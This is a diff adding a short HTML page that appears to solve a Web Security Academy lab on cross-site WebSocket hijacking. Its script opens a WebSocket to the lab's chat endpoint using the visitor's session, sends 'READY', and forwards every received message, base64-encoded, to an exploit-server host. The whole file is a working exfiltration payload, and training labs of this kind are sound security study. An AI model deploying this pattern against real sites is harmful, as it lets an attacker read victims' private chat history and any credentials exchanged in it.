@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        let newWebSocket = new WebSocket("wss://0a81007203eaa4dd80dc033d00740032.web-security-academy.net/chat");
+        newWebSocket.onopen = function () {
+            newWebSocket.send("READY");
+        }
+        newWebSocket.onmessage = function (evt) {
+            var message = evt.data;
+            fetch("https://exploit-0ac300cb036da4ed801e021601dc008b.exploit-server.net/exploit?message="+btoa(evt.data));
+        };
+    </script>
+</body>
+</html>
